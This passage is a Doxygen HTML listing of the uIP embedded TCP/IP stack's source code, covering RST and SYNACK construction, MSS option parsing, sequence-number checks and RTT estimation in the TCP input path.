<a name="l01235"></a>01235   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[2] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[2];
<a name="l01236"></a>01236   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[2] = c;
<a name="l01237"></a>01237   
<a name="l01238"></a>01238   c = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[1];
<a name="l01239"></a>01239   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[1] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[1];
<a name="l01240"></a>01240   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[1] = c;
<a name="l01241"></a>01241   
<a name="l01242"></a>01242   c = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[0];
<a name="l01243"></a>01243   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[0];
<a name="l01244"></a>01244   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[0] = c;
<a name="l01245"></a>01245 
<a name="l01246"></a>01246   <span class="comment">/* We also have to increase the sequence number we are</span>
<a name="l01247"></a>01247 <span class="comment">     acknowledging. If the least significant byte overflowed, we need</span>
<a name="l01248"></a>01248 <span class="comment">     to propagate the carry to the other bytes as well. */</span>
<a name="l01249"></a>01249   <span class="keywordflow">if</span>(++<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[3] == 0) {
<a name="l01250"></a>01250     <span class="keywordflow">if</span>(++<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[2] == 0) {
<a name="l01251"></a>01251       <span class="keywordflow">if</span>(++<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[1] == 0) {
<a name="l01252"></a>01252         ++<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[0];
<a name="l01253"></a>01253       }
<a name="l01254"></a>01254     }
<a name="l01255"></a>01255   }
<a name="l01256"></a>01256  
<a name="l01257"></a>01257   <span class="comment">/* Swap port numbers. */</span>
<a name="l01258"></a>01258   tmp16 = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcport;
<a name="l01259"></a>01259   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcport = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destport;
<a name="l01260"></a>01260   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destport = tmp16;
<a name="l01261"></a>01261   
<a name="l01262"></a>01262   <span class="comment">/* Swap IP addresses. */</span>
<a name="l01263"></a>01263   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr);
<a name="l01264"></a>01264   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>);
<a name="l01265"></a>01265   
<a name="l01266"></a>01266   <span class="comment">/* And send out the RST packet! */</span>
<a name="l01267"></a>01267   <span class="keywordflow">goto</span> tcp_send_noconn;
<a name="l01268"></a>01268 
<a name="l01269"></a>01269   <span class="comment">/* This label will be jumped to if we matched the incoming packet</span>
<a name="l01270"></a>01270 <span class="comment">     with a connection in LISTEN. In that case, we should create a new</span>
<a name="l01271"></a>01271 <span class="comment">     connection and send a SYNACK in return. */</span>
<a name="l01272"></a>01272  found_listen:
<a name="l01273"></a>01273   <span class="comment">/* First we check if there are any connections avaliable. Unused</span>
<a name="l01274"></a>01274 <span class="comment">     connections are kept in the same table as used connections, but</span>
<a name="l01275"></a>01275 <span class="comment">     unused ones have the tcpstate set to CLOSED. Also, connections in</span>
<a name="l01276"></a>01276 <span class="comment">     TIME_WAIT are kept track of and we'll use the oldest one if no</span>
<a name="l01277"></a>01277 <span class="comment">     CLOSED connections are found. Thanks to Eddie C. Dost for a very</span>
<a name="l01278"></a>01278 <span class="comment">     nice algorithm for the TIME_WAIT search. */</span>
<a name="l01279"></a>01279   uip_connr = 0;
<a name="l01280"></a>01280   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#gf5fe83be78b78b9e7d9e7f1e34ab1cc5">UIP_CONNS</a>; ++c) {
<a name="l01281"></a>01281     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c].<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> == <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>) {
<a name="l01282"></a>01282       uip_connr = &amp;<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c];
<a name="l01283"></a>01283       <span class="keywordflow">break</span>;
<a name="l01284"></a>01284     }
<a name="l01285"></a>01285     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c].<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> == <a class="code" href="a00150.html#gfff0ed43201bf1e2020de1a0d6cac070">UIP_TIME_WAIT</a>) {
<a name="l01286"></a>01286       <span class="keywordflow">if</span>(uip_connr == 0 ||
<a name="l01287"></a>01287          <a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c].<a class="code" href="a00087.html">timer</a> &gt; uip_connr-&gt;<a class="code" href="a00088.html#2d9732cf5752d30bd11cb25dc7d0c8d3">timer</a>) {
<a name="l01288"></a>01288         uip_connr = &amp;<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[c];
<a name="l01289"></a>01289       }
<a name="l01290"></a>01290     }
<a name="l01291"></a>01291   }
<a name="l01292"></a>01292 
<a name="l01293"></a>01293   <span class="keywordflow">if</span>(uip_connr == 0) {
<a name="l01294"></a>01294     <span class="comment">/* All connections are used already, we drop packet and hope that</span>
<a name="l01295"></a>01295 <span class="comment">       the remote end will retransmit the packet at a time when we</span>
<a name="l01296"></a>01296 <span class="comment">       have more spare connections. */</span>
<a name="l01297"></a>01297     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#494ea6767a8a8fab7abe96b799d6c3b3">syndrop</a>);
<a name="l01298"></a>01298     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"tcp: found no unused connections."</span>);
<a name="l01299"></a>01299     <span class="keywordflow">goto</span> drop;
<a name="l01300"></a>01300   }
<a name="l01301"></a>01301   <a class="code" href="a00088.html">uip_conn</a> = uip_connr;
<a name="l01302"></a>01302   
<a name="l01303"></a>01303   <span class="comment">/* Fill in the necessary fields for the new connection. */</span>
<a name="l01304"></a>01304   uip_connr-&gt;rto = uip_connr-&gt;timer = <a class="code" href="a00153.html#g15de27b044603284f68db05a378235a7">UIP_RTO</a>;
<a name="l01305"></a>01305   uip_connr-&gt;sa = 0;
<a name="l01306"></a>01306   uip_connr-&gt;sv = 4;
<a name="l01307"></a>01307   uip_connr-&gt;nrtx = 0;
<a name="l01308"></a>01308   uip_connr-&gt;lport = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destport;
<a name="l01309"></a>01309   uip_connr-&gt;rport = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcport;
<a name="l01310"></a>01310   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(uip_connr-&gt;ripaddr, <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr);
<a name="l01311"></a>01311   uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#ga5e3c856b86725125d19fccc34cd9eb5">UIP_SYN_RCVD</a>;
<a name="l01312"></a>01312 
<a name="l01313"></a>01313   uip_connr-&gt;snd_nxt[0] = iss[0];
<a name="l01314"></a>01314   uip_connr-&gt;snd_nxt[1] = iss[1];
<a name="l01315"></a>01315   uip_connr-&gt;snd_nxt[2] = iss[2];
<a name="l01316"></a>01316   uip_connr-&gt;snd_nxt[3] = iss[3];
<a name="l01317"></a>01317   uip_connr-&gt;len = 1;
<a name="l01318"></a>01318 
<a name="l01319"></a>01319   <span class="comment">/* rcv_nxt should be the seqno from the incoming packet + 1. */</span>
<a name="l01320"></a>01320   uip_connr-&gt;rcv_nxt[3] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[3];
<a name="l01321"></a>01321   uip_connr-&gt;rcv_nxt[2] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[2];
<a name="l01322"></a>01322   uip_connr-&gt;rcv_nxt[1] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[1];
<a name="l01323"></a>01323   uip_connr-&gt;rcv_nxt[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[0];
<a name="l01324"></a>01324   uip_add_rcv_nxt(1);
<a name="l01325"></a>01325 
<a name="l01326"></a>01326   <span class="comment">/* Parse the TCP MSS option, if present. */</span>
<a name="l01327"></a>01327   <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset &amp; 0xf0) &gt; 0x50) {
<a name="l01328"></a>01328     <span class="keywordflow">for</span>(c = 0; c &lt; ((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset &gt;&gt; 4) - 5) &lt;&lt; 2 ;) {
<a name="l01329"></a>01329       opt = <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + c];
<a name="l01330"></a>01330       <span class="keywordflow">if</span>(opt == <a class="code" href="a00150.html#g1215163245304bad20d6c5608ad75ab7">TCP_OPT_END</a>) {
<a name="l01331"></a>01331         <span class="comment">/* End of options. */</span>
<a name="l01332"></a>01332         <span class="keywordflow">break</span>;
<a name="l01333"></a>01333       } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(opt == <a class="code" href="a00150.html#g9f1822e1d231235edacad691f3cb7bbb">TCP_OPT_NOOP</a>) {
<a name="l01334"></a>01334         ++c;
<a name="l01335"></a>01335         <span class="comment">/* NOP option. */</span>
<a name="l01336"></a>01336       } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(opt == <a class="code" href="a00150.html#g691688604655ea8943d15f14c60027d8">TCP_OPT_MSS</a> &amp;&amp;
<a name="l01337"></a>01337                 <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 1 + c] == <a class="code" href="a00150.html#g12f3bf821224b8e7b48a57ed3cea15cf">TCP_OPT_MSS_LEN</a>) {
<a name="l01338"></a>01338         <span class="comment">/* An MSS option with the right option length. */</span>
<a name="l01339"></a>01339         tmp16 = ((<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>)<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 2 + c] &lt;&lt; 8) |
<a name="l01340"></a>01340           (<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a>)<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#g15f2617f7dc1713f9d10282125c6027b">UIP_IPTCPH_LEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 3 + c];
<a name="l01341"></a>01341         uip_connr-&gt;initialmss = uip_connr-&gt;mss =
<a name="l01342"></a>01342           tmp16 &gt; <a class="code" href="a00153.html#g4910467b83a639f06739c82cd362037e">UIP_TCP_MSS</a>? <a class="code" href="a00153.html#g4910467b83a639f06739c82cd362037e">UIP_TCP_MSS</a>: tmp16;
<a name="l01343"></a>01343         
<a name="l01344"></a>01344         <span class="comment">/* And we are done processing options. */</span>
<a name="l01345"></a>01345         <span class="keywordflow">break</span>;
<a name="l01346"></a>01346       } <span class="keywordflow">else</span> {
<a name="l01347"></a>01347         <span class="comment">/* All other options have a length field, so that we easily</span>
<a name="l01348"></a>01348 <span class="comment">           can skip past them. */</span>
<a name="l01349"></a>01349         <span class="keywordflow">if</span>(<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 1 + c] == 0) {
<a name="l01350"></a>01350           <span class="comment">/* If the length field is zero, the options are malformed</span>
<a name="l01351"></a>01351 <span class="comment">             and we don't process them further. */</span>
<a name="l01352"></a>01352           <span class="keywordflow">break</span>;
<a name="l01353"></a>01353         }
<a name="l01354"></a>01354         c += <a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#gee37386b2ab828787c05227eb109def7">UIP_TCPIP_HLEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + 1 + c];
<a name="l01355"></a>01355       }
<a name="l01356"></a>01356     }
<a name="l01357"></a>01357   }
<a name="l01358"></a>01358   
<a name="l01359"></a>01359   <span class="comment">/* Our response will be a SYNACK. */</span>
<a name="l01360"></a>01360 <span class="preprocessor">#if UIP_ACTIVE_OPEN</span>
<a name="l01361"></a>01361 <span class="preprocessor"></span> tcp_send_synack:
<a name="l01362"></a>01362   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01363"></a>01363   
<a name="l01364"></a>01364  tcp_send_syn:
<a name="l01365"></a>01365   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags |= <a class="code" href="a00150.html#g6020613f5062417d9811cfa837215c83">TCP_SYN</a>;
<a name="l01366"></a>01366 <span class="preprocessor">#else </span><span class="comment">/* UIP_ACTIVE_OPEN */</span>
<a name="l01367"></a>01367  tcp_send_synack:
<a name="l01368"></a>01368   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g6020613f5062417d9811cfa837215c83">TCP_SYN</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01369"></a>01369 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ACTIVE_OPEN */</span>
<a name="l01370"></a>01370   
<a name="l01371"></a>01371   <span class="comment">/* We send out the TCP Maximum Segment Size option with our</span>
<a name="l01372"></a>01372 <span class="comment">     SYNACK. */</span>
<a name="l01373"></a>01373   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;optdata[0] = <a class="code" href="a00150.html#g691688604655ea8943d15f14c60027d8">TCP_OPT_MSS</a>;
<a name="l01374"></a>01374   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;optdata[1] = <a class="code" href="a00150.html#g12f3bf821224b8e7b48a57ed3cea15cf">TCP_OPT_MSS_LEN</a>;
<a name="l01375"></a>01375   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;optdata[2] = (<a class="code" href="a00153.html#g4910467b83a639f06739c82cd362037e">UIP_TCP_MSS</a>) / 256;
<a name="l01376"></a>01376   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;optdata[3] = (<a class="code" href="a00153.html#g4910467b83a639f06739c82cd362037e">UIP_TCP_MSS</a>) &amp; 255;
<a name="l01377"></a>01377   <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00150.html#g15f2617f7dc1713f9d10282125c6027b">UIP_IPTCPH_LEN</a> + <a class="code" href="a00150.html#g12f3bf821224b8e7b48a57ed3cea15cf">TCP_OPT_MSS_LEN</a>;
<a name="l01378"></a>01378   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset = ((<a class="code" href="a00150.html#g17d111686f98e4c09db73a770ac3f1a4">UIP_TCPH_LEN</a> + TCP_OPT_MSS_LEN) / 4) &lt;&lt; 4;
<a name="l01379"></a>01379   <span class="keywordflow">goto</span> tcp_send;
<a name="l01380"></a>01380 
<a name="l01381"></a>01381   <span class="comment">/* This label will be jumped to if we found an active connection. */</span>
<a name="l01382"></a>01382  found:
<a name="l01383"></a>01383   <a class="code" href="a00088.html">uip_conn</a> = uip_connr;
<a name="l01384"></a>01384   <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = 0;
<a name="l01385"></a>01385   <span class="comment">/* We do a very naive form of TCP reset processing; we just accept</span>
<a name="l01386"></a>01386 <span class="comment">     any RST and kill our connection. We should in fact check if the</span>
<a name="l01387"></a>01387 <span class="comment">     sequence number of this reset is wihtin our advertised window</span>
<a name="l01388"></a>01388 <span class="comment">     before we accept the reset. */</span>
<a name="l01389"></a>01389   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g5ca559def464ef20d8b1f7d32f2f160d">TCP_RST</a>) {
<a name="l01390"></a>01390     uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>;
<a name="l01391"></a>01391     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"tcp: got reset, aborting connection."</span>);
<a name="l01392"></a>01392     <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#ga4c4310e54f18541b09e1e251fe7b22d">UIP_ABORT</a>;
<a name="l01393"></a>01393     <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l01394"></a>01394     <span class="keywordflow">goto</span> drop;
<a name="l01395"></a>01395   }
<a name="l01396"></a>01396   <span class="comment">/* Calculated the length of the data, if the application has sent</span>
<a name="l01397"></a>01397 <span class="comment">     any data to us. */</span>
<a name="l01398"></a>01398   c = (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset &gt;&gt; 4) &lt;&lt; 2;
<a name="l01399"></a>01399   <span class="comment">/* uip_len will contain the length of the actual TCP data. This is</span>
<a name="l01400"></a>01400 <span class="comment">     calculated by subtracing the length of the TCP header (in</span>
<a name="l01401"></a>01401 <span class="comment">     c) and the length of the IP header (20 bytes). */</span>
<a name="l01402"></a>01402   <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> - c - <a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a>;
<a name="l01403"></a>01403 
<a name="l01404"></a>01404   <span class="comment">/* First, check if the sequence number of the incoming packet is</span>
<a name="l01405"></a>01405 <span class="comment">     what we're expecting next. If not, we send out an ACK with the</span>
<a name="l01406"></a>01406 <span class="comment">     correct numbers in. */</span>
<a name="l01407"></a>01407   <span class="keywordflow">if</span>(!(((uip_connr-&gt;tcpstateflags &amp; <a class="code" href="a00150.html#g13dfcb4a5f920e108253ade527a66cc2">UIP_TS_MASK</a>) == <a class="code" href="a00150.html#g8af482dec973db57d8b3bd3f69461488">UIP_SYN_SENT</a>) &amp;&amp;
<a name="l01408"></a>01408        ((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g1425d4a0c2760adb653a04c0fb137a8d">TCP_CTL</a>) == (<a class="code" href="a00150.html#g6020613f5062417d9811cfa837215c83">TCP_SYN</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>)))) {
<a name="l01409"></a>01409     <span class="keywordflow">if</span>((<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt; 0 || ((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; (<a class="code" href="a00150.html#g6020613f5062417d9811cfa837215c83">TCP_SYN</a> | <a class="code" href="a00150.html#g88e60aa2cf23e1c65d630701db08c743">TCP_FIN</a>)) != 0)) &amp;&amp;
<a name="l01410"></a>01410        (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[0] != uip_connr-&gt;rcv_nxt[0] ||
<a name="l01411"></a>01411         <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[1] != uip_connr-&gt;rcv_nxt[1] ||
<a name="l01412"></a>01412         <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[2] != uip_connr-&gt;rcv_nxt[2] ||
<a name="l01413"></a>01413         <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[3] != uip_connr-&gt;rcv_nxt[3])) {
<a name="l01414"></a>01414       <span class="keywordflow">goto</span> tcp_send_ack;
<a name="l01415"></a>01415     }
<a name="l01416"></a>01416   }
<a name="l01417"></a>01417 
<a name="l01418"></a>01418   <span class="comment">/* Next, check if the incoming segment acknowledges any outstanding</span>
<a name="l01419"></a>01419 <span class="comment">     data. If so, we update the sequence number, reset the length of</span>
<a name="l01420"></a>01420 <span class="comment">     the outstanding data, calculate RTT estimations, and reset the</span>
<a name="l01421"></a>01421 <span class="comment">     retransmission timer. */</span>
<a name="l01422"></a>01422   <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>) &amp;&amp; <a class="code" href="a00147.html#gef14e83c046e19ab9fe9d1bbcca276c2">uip_outstanding</a>(uip_connr)) {
<a name="l01423"></a>01423     <a class="code" href="a00150.html#g6832e4d2d046536b6472f7ac92340f68">uip_add32</a>(uip_connr-&gt;snd_nxt, uip_connr-&gt;len);
<a name="l01424"></a>01424 
<a name="l01425"></a>01425     <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[0] == <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[0] &amp;&amp;
<a name="l01426"></a>01426        <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[1] == <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[1] &amp;&amp;
<a name="l01427"></a>01427        <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[2] == <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[2] &amp;&amp;
<a name="l01428"></a>01428        <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[3] == <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[3]) {
<a name="l01429"></a>01429       <span class="comment">/* Update sequence number. */</span>
<a name="l01430"></a>01430       uip_connr-&gt;snd_nxt[0] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[0];
<a name="l01431"></a>01431       uip_connr-&gt;snd_nxt[1] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[1];
<a name="l01432"></a>01432       uip_connr-&gt;snd_nxt[2] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[2];
<a name="l01433"></a>01433       uip_connr-&gt;snd_nxt[3] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[3];
<a name="l01434"></a>01434         
<a name="l01435"></a>01435 
<a name="l01436"></a>01436       <span class="comment">/* Do RTT estimation, unless we have done retransmissions. */</span>
<a name="l01437"></a>01437       <span class="keywordflow">if</span>(uip_connr-&gt;nrtx == 0) {
<a name="l01438"></a>01438         <span class="keywordtype">signed</span> <span class="keywordtype">char</span> m;
<a name="l01439"></a>01439         m = uip_connr-&gt;rto - uip_connr-&gt;timer;
<a name="l01440"></a>01440         <span class="comment">/* This is taken directly from VJs original code in his paper */</span>
<a name="l01441"></a>01441         m = m - (uip_connr-&gt;sa &gt;&gt; 3);
<a name="l01442"></a>01442         uip_connr-&gt;sa += m;
<a name="l01443"></a>01443         <span class="keywordflow">if</span>(m &lt; 0) {
<a name="l01444"></a>01444           m = -m;
<a name="l01445"></a>01445         }
<a name="l01446"></a>01446         m = m - (uip_connr-&gt;sv &gt;&gt; 2);
<a name="l01447"></a>01447         uip_connr-&gt;sv += m;
<a name="l01448"></a>01448         uip_connr-&gt;rto = (uip_connr-&gt;sa &gt;&gt; 3) + uip_connr-&gt;sv;
<a name="l01449"></a>01449 
<a name="l01450"></a>01450       }
<a name="l01451"></a>01451       <span class="comment">/* Set the acknowledged flag. */</span>
<a name="l01452"></a>01452       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#g6bfa488f87f68a6f7f4a3efb9e45eaf8">UIP_ACKDATA</a>;
<a name="l01453"></a>01453       <span class="comment">/* Reset the retransmission timer. */</span>
<a name="l01454"></a>01454       uip_connr-&gt;timer = uip_connr-&gt;rto;
<a name="l01455"></a>01455 
<a name="l01456"></a>01456       <span class="comment">/* Reset length of outstanding data. */</span>
<a name="l01457"></a>01457       uip_connr-&gt;len = 0;
<a name="l01458"></a>01458     }
<a name="l01459"></a>01459     
<a name="l01460"></a>01460   }
<a name="l01461"></a>01461 
<a name="l01462"></a>01462   <span class="comment">/* Do different things depending on in what state the connection is. */</span>
<a name="l01463"></a>01463   <span class="keywordflow">switch</span>(uip_connr-&gt;tcpstateflags &amp; <a class="code" href="a00150.html#g13dfcb4a5f920e108253ade527a66cc2">UIP_TS_MASK</a>) {
<a name="l01464"></a>01464     <span class="comment">/* CLOSED and LISTEN are not handled here. CLOSE_WAIT is not</span>
<a name="l01465"></a>01465 <span class="comment">        implemented, since we force the application to close when the</span>
<a name="l01466"></a>01466 <span class="comment">        peer sends a FIN (hence the application goes directly from</span>
<a name="l01467"></a>01467 <span class="comment">        ESTABLISHED to LAST_ACK). */</span>
<a name="l01468"></a>01468   <span class="keywordflow">case</span> <a class="code" href="a00150.html#ga5e3c856b86725125d19fccc34cd9eb5">UIP_SYN_RCVD</a>:
<a name="l01469"></a>01469     <span class="comment">/* In SYN_RCVD we have sent out a SYNACK in response to a SYN, and</span>
